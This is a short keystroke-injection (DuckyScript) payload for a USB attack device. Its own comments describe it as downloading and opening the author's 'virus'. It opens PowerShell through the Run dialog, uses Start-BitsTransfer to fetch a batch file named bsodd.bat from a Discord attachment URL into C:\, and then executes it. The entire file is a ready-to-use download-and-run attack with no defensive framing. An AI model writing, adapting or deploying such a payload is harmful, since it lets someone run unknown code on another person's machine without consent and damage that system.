REM made by Lachlan 
REM this script downloads @lach#4305's virus and opens it
DELAY 3000
GUI r
DELAY 1000
STRING powershell
DELAY 1000
ENTER
DELAY 1000
STRING cd C:\
DELAY 1000
ENTER
DELAY 1000
STRING Start-BitsTransfer 'https://cdn.discordapp.com/attachments/1065798566674702370/1065798594227077250/bsodd.bat'
DELAY 1000
ENTER
DELAY 10000
STRING START-PROCESS "C:\bsodd.bat"
DELAY 500
ENTER